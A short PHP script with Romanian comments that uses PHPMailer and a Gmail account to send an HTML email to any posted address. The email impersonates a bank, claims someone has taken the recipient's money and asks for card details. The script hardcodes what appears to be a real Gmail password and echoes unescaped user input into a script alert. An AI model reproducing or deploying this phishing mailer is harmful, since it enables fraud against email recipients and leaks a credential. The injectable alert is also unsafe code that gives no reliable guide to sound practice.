<?php
// trimirea emailurilor
use PHPMailer\PHPMailer\PHPMailer;
// sa primim erori
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
//smtp - simple mail transfer protocol

if (isset($_POST['send'])) {
    // PHPMailer
    $mail = new PHPMailer(true);

    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'gabriela.hr0622@gmail.com';
    $mail->Password = 'nukkdikvimbblgav';
    $mail->SMTPSecure = 'tls';
    //ssl - librarie pentru securizarea datelor trimise intre 2 servere (noi si gmailul trimis de client)
    $mail->Port = 587; // 465 - portul la google

    $mail->setFrom('gabriela.hr0622@gmail.com');

    $mail->addAddress($_POST['email']);

    $mail->isHTML(true);

    $mail->Subject = $_POST["subject"];
    // $mail->Body = $_POST["message"];
    $mail->Body = "<div style='display: background-color: white'>
    <img style='height: 75px' src='https://upload.wikimedia.org/wikipedia/ro/thumb/8/82/Victoriabank_logo.svg/2560px-Victoriabank_logo.svg.png' alt='MAIB' />
    <br>
    <h1 style='color: red'>Atentie!</h1>
    <p>Cineva are toti banii tai!</p>
    <p>Trimite datele cardului ca sa fixam problema</p>
    <a href='https://i.giphy.com/WXB88TeARFVvi.webp' style='padding: 15px 40px; color: white; font-size: 20px; background-color: #5C50F3; border-radius: 100px; display: inline-block; text-decoration: none'>Accesati contul bancar</a>
    </div>";

    for ($i = 0; $i < 1; $i++) {
        $mail->send();
    }

    echo "<script>
        alert('Email sent to: $_POST[email]')
        document.location.href = 'index.php';
    </script>";
}